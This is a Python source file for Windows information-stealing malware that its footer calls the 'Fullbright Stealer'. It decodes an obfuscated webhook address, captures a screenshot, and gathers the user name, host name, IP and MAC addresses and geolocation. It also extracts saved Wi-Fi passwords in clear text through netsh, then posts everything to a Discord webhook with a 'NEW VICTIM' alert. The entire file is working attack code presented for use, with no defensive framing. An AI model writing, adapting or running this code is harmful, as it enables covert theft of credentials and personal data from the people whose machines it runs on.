import os, pyautogui, requests, socket, datetime, json, psutil, platform, subprocess
import base64
from co.config import WEBHOOK_URI
decoded_uri = base64.b64decode(WEBHOOK_URI).decode('utf-8')
swapped_case = decoded_uri.swapcase()
reversed_uri = swapped_case[::-1]
WEBHOOK_URL = reversed_uri
def get_geolocation(ip):
    apis=[f"https://ipinfo.io/{ip}/json", f"https://ipapi.co/{ip}/json/", f"http://ip-api.com/json/{ip}"]
    for api in apis:
        try:
            response=requests.get(api,timeout=5)
            if response.status_code==200:
                data=response.json()
                if "city" in data and "region" in data and "country" in data:
                    return data.get("city","Unknown"),data.get("region","Unknown"),data.get("country","Unknown")
        except Exception: continue
    return "Nada","N/A","Zilch"
def get_wifi_info():
    wifi_info=[]
    try:
        profiles_output=subprocess.check_output("netsh wlan show profiles",shell=True,text=True)
        ssids=[]
        for line in profiles_output.split('\n'):
            if "All User Profile" in line:
                ssid=line.split(":")[1][1:].strip()
                ssids.append(ssid)
        for ssid in ssids:
            try:
                password_output=subprocess.check_output(f"netsh wlan show profile name=\"{ssid}\" key=clear",shell=True,text=True)
                password_found=False
                for pass_line in password_output.split('\n'):
                    if "Key Content" in pass_line:
                        password=pass_line.split(":")[1][1:].strip()
                        wifi_info.append(f"{ssid}:{password}")
                        password_found=True
                        break
                if not password_found:
                    wifi_info.append(f"{ssid}:NO PWD")
            except subprocess.CalledProcessError as e:
                wifi_info.append(f"{ssid}:Error retrieving password")
    except subprocess.CalledProcessError:
        return "Could not retrieve Wi-Fi profiles or insufficient permissions."
    except Exception as e:
        return f"An unexpected error occurred: {e}"
    return '\n'.join(wifi_info) if wifi_info else "No Wi-Fi information available."
def get_windows_version():
    try:
        result = subprocess.check_output('systeminfo | findstr /B /C:"OS Name"', shell=True, text=True)
        for line in result.splitlines():
            if "OS Name" in line:
                os_name = line.split(":")[1].strip()
                return os_name
    except subprocess.CalledProcessError:
        return "Unable to retrieve OS information"
def sendinfo():
    webhook_url = WEBHOOK_URL
    screenshot_path = os.path.join(os.getenv('APPDATA'), 'screenshot.png')
    pyautogui.screenshot(screenshot_path)
    host_name = socket.gethostname()
    user_name = os.getlogin()
    ipv4 = requests.get("https://api64.ipify.org").text
    try:
        ipv6 = psutil.net_if_addrs()['Ethernet'][2].address if 'Ethernet' in psutil.net_if_addrs() else 'N/A'
    except (IndexError, KeyError): ipv6 = 'N/A'
    try:
        mac_address = psutil.net_if_addrs()['Ethernet'][0].address if 'Ethernet' in psutil.net_if_addrs() else 'N/A'
    except (IndexError, KeyError): mac_address = 'N/A'
    try:
        private_ipv4 = psutil.net_if_addrs()['Wi-Fi'][1].address if 'Wi-Fi' in psutil.net_if_addrs() else 'N/A'
    except (IndexError, KeyError): private_ipv4 = 'N/A'
    windows_version = get_windows_version()
    local_time = datetime.datetime.now().strftime('%A, %B %d, %Y %I:%M:%S %p')
    timezone = datetime.datetime.now().astimezone().tzinfo
    location = get_geolocation(ipv4)
    wifi_info = get_wifi_info()
    initial_message = {"content": f"||@everyone|| NEW VICTIM: {user_name}"}
    requests.post(webhook_url, json=initial_message)
    embed_screenshot = {
        "embeds": [{
            "color": 3447003,
            "author": {"name": "CLICK 2 JOIN RAYWZW's DISCORD", "url": "https://discord.gg/aGpfgnW4aW"},
            "fields": [
                {"name": "👤 **PC User**", "value": user_name, "inline": True},
                {"name": "🖥️ **PC Name**", "value": host_name, "inline": True},
                {"name": "🪟 **Windows Version**", "value": windows_version, "inline": True},
                {"name": "📅 **Local Date/Time**", "value": local_time, "inline": True},
                {"name": "🌐 **IPv4**", "value": ipv4, "inline": True},
                {"name": "🔍 **IPv6**", "value": ipv6, "inline": True},
                {"name": "🔒 **MAC Address**", "value": mac_address, "inline": True},
                {"name": "🔐 **Private IPv4**", "value": private_ipv4, "inline": True},
                {"name": "📍 **Geolocation**", "value": f"{location[0]}, {location[1]}, {location[2]}", "inline": True},
                {"name": "🌍 **Time Zone**", "value": str(timezone), "inline": True},
                {"name": "📶 **Wi-Fi Info**", "value": wifi_info, "inline": False}
            ],
            "image": {"url": "attachment://screenshot.png"},
            "footer": {"text": "FULLBRIGHT STEALER BY RAYWZW"}
        }]
    }
    with open(screenshot_path, 'rb') as file:
        files = {'file': ('screenshot.png', file)}
        response = requests.post(webhook_url, files=files, data={'payload_json': json.dumps(embed_screenshot)})
        if response.status_code == 204:
            print("Screenshot sent successfully!")
        else:
            print(f"Failed to send screenshot. Status code: {response.status_code}")
    os.remove(screenshot_path)